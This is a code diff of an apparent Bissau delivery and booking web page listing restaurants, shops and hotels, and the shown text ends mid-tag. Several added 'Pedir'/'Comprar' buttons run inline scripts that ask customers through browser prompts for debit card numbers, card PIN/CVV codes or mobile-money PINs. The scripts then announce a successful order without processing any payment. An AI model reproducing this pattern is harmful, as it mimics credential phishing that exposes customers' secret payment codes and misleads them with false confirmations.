@@ -555,7 +555,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #ff6b00; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="pedirComida('Papa Loca Bissau')">Pedir</button>
+                <button onclick="let prato = prompt('--- RESTAURANTE: Papa Loca Bissau ---\n\n1. Hamburger Completo (2.500 FCFA)\n2. Grelhado Misto (4.000 FCFA)\n3. Combo Família Fast Food (6.000 FCFA)\n\nDigite o número do pedido:'); if(prato) { let end = prompt('Introduza o seu Endereço / Ponto de Referência em Bissau:'); if(end) { let pag = prompt('Escolha o Método de Pagamento:\n\n1. Orange Money\n2. Telecel Cash\n3. Cartão de Débito\n\nDigite o número do método:'); if(pag) { let dadosExtra = ''; if(pag === '3') { let card = prompt('Introduza o Número do Cartão de Débito (16 dígitos):'); if(card) dadosExtra = prompt('Introduza o Código Secreto do Cartão (PIN / CVV):'); } else { dadosExtra = prompt('Introduza o PIN / Confirmação Móvel:'); } if(dadosExtra !== null) alert('Pedido Confirmado com Sucesso!\nPrato Opção: ' + prato + '\nEntrega em: ' + end + '\nMétodo: ' + (pag === '1' ? 'Orange Money' : pag === '2' ? 'Telecel Cash' : 'Cartão de Débito')); } } }" class="btn-primary" style="padding:6px 12px; font-size:11px;">Pedir</button>
                 <a href="https://wa.me/2456892222" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -574,7 +574,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #ff6b00; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="pedirComida('A Padeira Africana')">Pedir</button>
+                <button onclick="let prato = prompt('--- RESTAURANTE: A Padeira Africana ---\n\n1. Galinha Cafriela (3.000 FCFA)\n2. Caldo de Mancarra com Arroz (4.500 FCFA)\n3. Prato Especial Típico (7.500 FCFA)\n\nDigite o número do pedido:'); if(prato) { let end = prompt('Introduza o seu Endereço / Ponto de Referência em Bissau:'); if(end) { let pag = prompt('Escolha o Método de Pagamento:\n\n1. Orange Money\n2. Telecel Cash\n3. Cartão de Débito\n\nDigite o número do método:'); if(pag) { let dadosExtra = ''; if(pag === '3') { let card = prompt('Introduza o Número do Cartão de Débito (16 dígitos):'); if(card) dadosExtra = prompt('Introduza o Código Secreto do Cartão (PIN / CVV):'); } else { dadosExtra = prompt('Introduza o PIN / Confirmação Móvel:'); } if(dadosExtra !== null) alert('Pedido Confirmado com Sucesso!\nPrato Opção: ' + prato + '\nEntrega em: ' + end + '\nMétodo: ' + (pag === '1' ? 'Orange Money' : pag === '2' ? 'Telecel Cash' : 'Cartão de Débito')); } } }" class="btn-primary" style="padding:6px 12px; font-size:11px;">Pedir</button>
                 <a href="https://wa.me/245966131393" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -593,7 +593,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #ff6b00; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="pedirComida('Restaurante O Coqueiro')">Pedir</button>
+                <button onclick="iniciarPedido('Restaurante O Coqueiro', 'Restaurante')" class="btn-primary" style="padding:6px 12px; font-size:11px;">Pedir</button>
                 <a href="https://wa.me/245966202174" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -612,7 +612,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #ff6b00; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="pedirComida('Snack-Bar Oasis')">Pedir</button>
+                <button onclick="iniciarPedido('Snack-Bar Oasis', 'Restaurante')" class="btn-primary" style="padding:6px 12px; font-size:11px;">Pedir</button>
                 <a href="https://wa.me/245955404040" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -631,7 +631,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #ff6b00; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="pedirComida('Chez Sapphire')">Pedir</button>
+                <button onclick="iniciarPedido('Chez Sapphire', 'Restaurante')" class="btn-primary" style="padding:6px 12px; font-size:11px;">Pedir</button>
                 <a href="https://wa.me/245966505050" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -650,7 +650,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #ff6b00; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="pedirComida('Pizzeria Calabresa')">Pedir</button>
+                <button onclick="iniciarPedido('Pizzeria Calabresa', 'Restaurante')" class="btn-primary" style="padding:6px 12px; font-size:11px;">Pedir</button>
                 <a href="https://wa.me/245955606060" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -669,7 +669,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #ff6b00; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="pedirComida('Cantinho dos Grelhados')">Pedir</button>
+                <button onclick="iniciarPedido(' Cantinho dos Grelhados', 'Restaurante')" class="btn-primary" style="padding:6px 12px; font-size:11px;">Pedir</button>
                 <a href="https://wa.me/245966707070" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -696,7 +696,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #28a745; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="comprarLoja('Supermercado Hereso')">Comprar</button>
+                <button onclick="let prod = prompt('--- LOJA: Supermercado Hereso ---\n\n1. Saco de Arroz 50kg (18.500 FCFA)\n2. Garrafão de Óleo 5L (6.000 FCFA)\n3. Kit Essencial Alimentação (12.000 FCFA)\n\nDigite o número da opção:'); if(prod) { let end = prompt('Introduza o Endereço para Entrega em Bissau:'); if(end) { let pag = prompt('Escolha o Método de Pagamento:\n\n1. Orange Money\n2. Telecel Cash\n3. Cartão de Débito\n\nDigite o número do método:'); if(pag) { let dadosExtra = ''; if(pag === '3') { let card = prompt('Introduza o Número do Cartão de Débito (16 dígitos):'); if(card) dadosExtra = prompt('Introduza o Código Secreto do Cartão (PIN / CVV):'); } else { dadosExtra = prompt('Introduza o PIN / Confirmação Móvel:'); } if(dadosExtra !== null) alert('Compra Efetuada com Sucesso!\nProduto Opção: ' + prod + '\nEntrega em: ' + end + '\nMétodo: ' + (pag === '1' ? 'Orange Money' : pag === '2' ? 'Telecel Cash' : 'Cartão de Débito')); } } }" class="btn-primary" style="padding:6px 12px; font-size:11px; background:#00a86b; color:#fff;">Comprar</button>
                 <a href="https://wa.me/245955908901" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -715,7 +715,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #28a745; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="comprarLoja('Mini-Mercado Bandim')">Comprar</button>
+                <button onclick="let prod = prompt('--- LOJA: Mini-Mercado Bandim ---\n\n1. Cabaz Familiar Mercearia (10.000 FCFA)\n2. Kit Produtos de Higiene (5.000 FCFA)\n3. Pacote Frescos e Bebidas (8.000 FCFA)\n\nDigite o número da opção:'); if(prod) { let end = prompt('Introduza o Endereço para Entrega em Bissau:'); if(end) { let pag = prompt('Escolha o Método de Pagamento:\n\n1. Orange Money\n2. Telecel Cash\n3. Cartão de Débito\n\nDigite o número do método:'); if(pag) { let dadosExtra = ''; if(pag === '3') { let card = prompt('Introduza o Número do Cartão de Débito (16 dígitos):'); if(card) dadosExtra = prompt('Introduza o Código Secreto do Cartão (PIN / CVV):'); } else { dadosExtra = prompt('Introduza o PIN / Confirmação Móvel:'); } if(dadosExtra !== null) alert('Compra Efetuada com Sucesso!\nProduto Opção: ' + prod + '\nEntrega em: ' + end + '\nMétodo: ' + (pag === '1' ? 'Orange Money' : pag === '2' ? 'Telecel Cash' : 'Cartão de Débito')); } } }" class="btn-primary" style="padding:6px 12px; font-size:11px; background:#00a86b; color:#fff;">Comprar</button>
                 <a href="https://wa.me/245966358728" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -734,7 +734,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #28a745; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="comprarLoja('Farmácia Central Bissau')">Comprar</button>
+                <button onclick="iniciarPedido('Farmácia Central Bissau', 'Loja')" class="btn-primary" style="padding:6px 12px; font-size:11px; background:#00a86b; color:#fff;">Comprar</button>
                 <a href="https://wa.me/245955312929" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -753,7 +753,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #28a745; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="comprarLoja('Boutique Guiné Moda')">Comprar</button>
+                <button onclick="iniciarPedido('Boutique Guiné Moda', 'Loja')" class="btn-primary" style="padding:6px 12px; font-size:11px; background:#00a86b; color:#fff;">Comprar</button>
                 <a href="https://wa.me/245966982682" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -780,7 +780,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #6f42c1; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="reservarHotel('Ledger Plaza Bissau')">Reservar</button>
+                <button onclick="iniciarPedido('Ledger Plaza Bissau', 'Hotel')" class="btn-primary" style="padding:6px 12px; font-size:11px; background:#6f42c1; color:#fff;">Reservar</button>
                 <a href="https://wa.me/245955000000" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -799,7 +799,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #6f42c1; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="reservarHotel('Azalai 24 de Setembro')">Reservar</button>
+                <button onclick="iniciarPedido('Azalai Hotel 24 de Setembro', 'Hotel')" class="btn-primary" style="padding:6px 12px; font-size:11px; background:#6f42c1; color:#fff;">Reservar</button>
                 <a href="https://wa.me/245966000000" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -818,7 +818,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #6f42c1; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="reservarHotel('Hotel Dunia')">Reservar</button>
+                <button onclick="iniciarPedido('Hotel Dunia', 'Hotel')" class="btn-primary" style="padding:6px 12px; font-size:11px; background:#6f42c1; color:#fff;">Reservar</button>
                 <a href="https://wa.me/245955123456" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
         </div>
@@ -837,7 +837,7 @@
                 </div>
             </div>
             <div style="display: flex; flex-direction: column; gap: 6px; align-items: flex-end;">
-                <button class="btn-pedir" style="background: #6f42c1; color: white; border: none; padding: 8px 14px; border-radius: 8px; font-weight: bold; cursor: pointer;" onclick="reservarHotel('Residencial Kala')">Reservar</button>
+                <button onclick="iniciarPedido('Residencial Kala', 'Hotel')" class="btn-primary" style="padding:6px 12px; font-size:11px; background:#6f42c1; color:#fff;">Reservar</button>
                 <a href="https://wa.me/245966789012" target="_blank" style="background: #25D366; color: white; text-decoration: none; font-size: 0.72em; padding: 4px 8px; border-radius: 6px; font-weight: bold;">💬 WhatsApp</a>
             </div>
             <img src="https://cf.bstatic.com/xdata/images/hotel/max1024x768/150009581.jpg" 
